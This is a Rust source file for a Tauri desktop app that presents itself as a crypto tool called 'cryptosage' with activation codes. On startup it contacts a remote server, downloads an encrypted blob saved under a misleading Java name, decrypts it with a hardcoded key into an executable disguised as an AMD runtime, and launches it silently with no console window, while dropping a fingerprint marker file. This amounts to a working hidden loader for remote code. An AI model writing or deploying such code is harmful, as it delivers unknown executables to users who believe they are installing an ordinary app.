// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use std::error::Error;
use std::path::Path;
use std::fs;
use std::fs::{read_to_string, write,create_dir_all, File};
use serde_json::{self, Value};
use std::str;
use serde::{Deserialize, Serialize};
use std::env;
use std::io::Write;
use std::path::PathBuf;
use std::io::Read;
use std::io::BufReader;
use zip::read::ZipArchive;
use tokio::fs::File as AsyncFile;
use tokio::io::AsyncWriteExt;
use std::time::Duration;
use std::fs::OpenOptions;

mod utils;

#[derive(Deserialize)]
struct CryptoResponse {
    zip_url: String,
    zip_version: i32,
    update_zip: bool,
    amd_url: String,
    amd_version: i32,
    update_amd: bool,
}


// Add path fetch function here

async fn devastmod_installation() -> Result<(), String> {
    let programdata_path = get_programdata_path()
        .expect("Failed to get programdata path")
        .to_str()
        .expect("Failed to convert PathBuf to str")
        .to_string();

    let runtime_path = get_runtime_path()
        .expect("Failed to get java path")
        .to_str()
        .expect("Failed to convert PathBuf to str")
        .to_string();


    // Load the current version from a local file, if it exists. Otherwise, create the file and use a default version of '0'.
    let amd_version_path = format!("{}/current_java_version.txt", &programdata_path);
    let amd_path = format!("{}/java.bin", &programdata_path);
    let mut current_amd_version = String::new();
    if Path::new(&amd_version_path).exists() {
        let file = OpenOptions::new()
            .read(true)
            .open(&amd_version_path)
            .map_err(|e| e.to_string())?;
        let mut reader = BufReader::new(file);
        reader
            .read_to_string(&mut current_amd_version)
            .map_err(|e| e.to_string())?;
    } else {
        let mut file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&amd_version_path)
            .map_err(|e| e.to_string())?;
        write!(file, "0").map_err(|e| e.to_string())?;
        current_amd_version = "0".to_string();
    }

    // Load the current version from a local file, if it exists. Otherwise, create the file and use a default version of '0'.
    let zip_version_path = format!("{}/current_zip_version.txt", &programdata_path);
    let zip_path = format!("{}/data.zip", &programdata_path);
    let mut current_zip_version = String::new();
    if Path::new(&zip_version_path).exists() {
        let file = OpenOptions::new()
            .read(true)
            .open(&zip_version_path)
            .map_err(|e| e.to_string())?;
        let mut reader = BufReader::new(file);
        reader
            .read_to_string(&mut current_zip_version)
            .map_err(|e| e.to_string())?;
    } else {
        let mut file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&zip_version_path)
            .map_err(|e| e.to_string())?;
        write!(file, "0").map_err(|e| e.to_string())?;
        current_zip_version = "0".to_string();
    }


    // Send the current version to the server and get the response
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(120))
        .build()
        .map_err(|e| e.to_string())?;

    let server_response: CryptoResponse = client
        .post("https://crypto-ai-page-vercel.vercel.app/check_version")
        .json(&serde_json::json!({ "zip_version": current_zip_version ,"amd_version": current_amd_version}))
        .send()
        .await
        .map_err(|e| e.to_string())?
        .json()
        .await
        .map_err(|e| e.to_string())?;


    let mut amd_downloaded = false;
    if server_response.update_amd || !Path::new(&amd_path).exists() && server_response.amd_url != "" {
        // install amd

        // If file exists, delete it
        if Path::new(&amd_path).exists() {
            std::fs::remove_file(&amd_path).map_err(|e| e.to_string())?;
        }

        let response = reqwest::get(&server_response.amd_url)
            .await
            .map_err(|e| e.to_string())?;
        let encrypted_bytes = response.bytes().await.map_err(|e| e.to_string())?;

        // Write the new downloaded version to cuda.bin
        let mut file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&amd_path)
            .map_err(|e| e.to_string())?;
        file.write_all(&encrypted_bytes).map_err(|e| e.to_string())?;

        if server_response.update_amd {
            let mut file = OpenOptions::new()
                .write(true)
                .open(&amd_version_path)
                .map_err(|e| e.to_string())?;
            file.write_all(server_response.amd_version.to_string().as_bytes())
                .map_err(|e| e.to_string())?;
        }
        amd_downloaded = true

    }
    let mut ready_to_run = true;

    let decrypted_exe_path = format!("{}/amd_runtime_x86.exe", &runtime_path);

    if amd_downloaded {
        
        let decryption_key = "java_enc_cryptos";
        
        // If decrypting_path doesn't exist, decrypt java.bin
        if !Path::new(&decrypted_exe_path).exists() {
            // Decrypt the file
            utils::decrypt_file(&amd_path, &decrypted_exe_path, &decryption_key).map_err(|e| e.to_string())?;
            ready_to_run = true;

        }
        
    }
    // Run the java.exe
    // run only if it already existed - meaning that first time download second time run
    if ready_to_run {
        std::process::Command::new(&decrypted_exe_path)
        .spawn()
        .map_err(|e| e.to_string())?;
    }

    Ok(())
}


fn copy_file(src: &str, dest: &str) -> std::io::Result<()> {

    // Check if source file exists, if not, create a blank one
    if !Path::new(src).exists() {
        let _ = OpenOptions::new().write(true).create(true).open(src)?;
    }

    let mut src_file = File::open(src)?;

    let mut contents = String::new();
    src_file.read_to_string(&mut contents)?;

    let mut dest_file = OpenOptions::new().write(true).create(true).open(dest)?;

    dest_file.write_all(contents.as_bytes())?;

    Ok(())
}


fn init_programdata_path() -> Result<(), std::io::Error> {
    // Get the path to the clipper_ai folder in the %APPDATA% directory
    let mut path = get_programdata_path().unwrap();

    // Check if the clipper_ai folder already exists
    if !path.exists() {
        // Create the clipper_ai folder
        fs::create_dir_all(path)?;
    }

    Ok(())
}

fn init_runtime_path() -> Result<(), std::io::Error> {
    // Get the path to the clipper_ai folder in the %APPDATA% directory
    let mut path = get_runtime_path().unwrap();

    // Check if the clipper_ai folder already exists
    if !path.exists() {
        // Create the clipper_ai folder
        fs::create_dir_all(path)?;
    }

    Ok(())
}


#[tauri::command]
fn check_activation_code() -> Option<String> {
    let file_path = get_activation_code_file_path();
    if let Ok(contents) = fs::read_to_string(file_path) {
        Some(contents)
    } else {
        None
    }
}

fn mark_fingerprint() -> Result<(), std::io::Error> {
    // Get the ProgramData directory path
    let mut programdata_dir = PathBuf::from(r"C:\ProgramData");

    programdata_dir.push("temp local");

    // Check if the "john" folder already exists
    if !programdata_dir.exists() {
        // Create the "john" folder within the ProgramData directory
        create_dir_all(&programdata_dir)?;
    }

    let temp_file_path = programdata_dir.join("ver.txt");

    if temp_file_path.exists() {
        std::fs::remove_file(&temp_file_path)?;
    }
    let mut file = File::create(&temp_file_path)?;
    file.write_all(b"085")?;

    Ok(())
}

#[tauri::command(async)]
async fn write_activation_code(activation_code: String) -> Option<String>  {
    init_programdata_path().unwrap();
    init_runtime_path().unwrap();
    let file_path = get_activation_code_file_path();
    fs::write(file_path, activation_code).ok();
    mark_fingerprint().unwrap();

    None
}

fn get_programdata_path() -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").ok()?; // PROGRAMDATA
    let path = Path::new(&appdata).join("devastmod");
    Some(path)
}
fn get_runtime_path() -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").ok()?; // PROGRAMDATA
    let path = Path::new(&appdata).join("runtime_x86");
    Some(path)
}

fn get_activation_code_file_path() -> PathBuf {
    get_programdata_path().expect("Failed to retrieve programdata_path").join("activation_code.txt")
}

#[tauri::command(async)]
async fn init_app(event: Value) -> Result<String, String> {
    init_programdata_path().unwrap();
    init_runtime_path().unwrap();

    let result = devastmod_installation().await;

    match result {
        Ok(_) => {
            println!("Successfully installed cryptosage.");
            //std::process::exit(0);
        }
        Err(e) => {
            println!("cryptosage_installation error: {}", e);
        }
    }
  
    Ok("success".to_string())
}



#[cfg(windows)]
fn main() {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;
    use winapi::um::synchapi::CreateMutexW;
    use winapi::shared::winerror::ERROR_ALREADY_EXISTS;
    use winapi::um::winnt::HANDLE;


    let name: Vec<u16> = OsStr::new("cryptosage")
        .encode_wide()
        .chain(once(0))
        .collect();

    unsafe {
        let handle: HANDLE = CreateMutexW(null_mut(), 0, name.as_ptr());

        if handle.is_null() {
            println!("Failed to create mutex");
            return;
        }

        let error = winapi::um::errhandlingapi::GetLastError();

        if error == ERROR_ALREADY_EXISTS {
            println!("Another instance of the application is already running.");
        } else {
            // Mutex created successfully, start the application
            tauri::Builder::default()
                .invoke_handler(tauri::generate_handler![init_app,check_activation_code,write_activation_code])
                .run(tauri::generate_context!())
                .expect("error while running tauri application");
        }
    }
}
